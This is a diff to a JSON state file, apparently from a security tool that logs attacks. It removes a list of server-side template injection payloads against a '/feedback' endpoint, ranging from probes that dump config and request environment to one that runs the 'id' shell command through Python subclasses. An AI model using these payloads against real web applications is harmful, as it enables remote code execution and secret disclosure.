@@ -1,40 +1,12 @@
 {
-  "initialized": true,
-  "attacks": [
-    "/feedback|<%= 7*7 %>",
-    "/feedback|{{7*'7'}}",
-    "/feedback|{{''.__class__.__mro__[1].__subclasses__()}}",
-    "/feedback|{%set x='__cla' 'ss__'%}{{''|attr(x)}}",
-    "/feedback|{{''.__class__.__mro__}}",
-    "/feedback|{{request.envin}}",
-    "/feedback|{{7*7}}",
-    "/feedback|{{config}}",
-    "/feedback|{{request.environment}}",
-    "/feedback|{{self.__dict__}}",
-    "/feedback|#{7*7}",
-    "/feedback|{{g}}",
-    "/feedback|{{config.items()}}",
-    "/feedback|{{request.environ}}",
-    "/feedback|{{request.env}}",
-    "/feedback|{{request|attr('application')|attr('__globals__')}}",
-    "/feedback|{{''.join(['_','_','c','l','a','s','s','_','_'])}}",
-    "/feedback|{{[].__class__.__mro__[-1].__subclasses__()}}",
-    "/feedback|{{().__class__.__bases__[0].__subclasses__()}}",
-    "/feedback|{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}"
-  ],
-  "candidates": [
-    "2",
-    "3",
-    "1",
-    "0"
-  ],
-  "deployed": [
-    "3"
-  ],
+  "initialized": false,
+  "attacks": [],
+  "candidates": [],
+  "deployed": [],
   "deployed_cluster_keyed": true,
   "settings": {
     "attack": true,
-    "enabled": false,
+    "enabled": true,
     "candidate": true,
     "deployed": true
   }
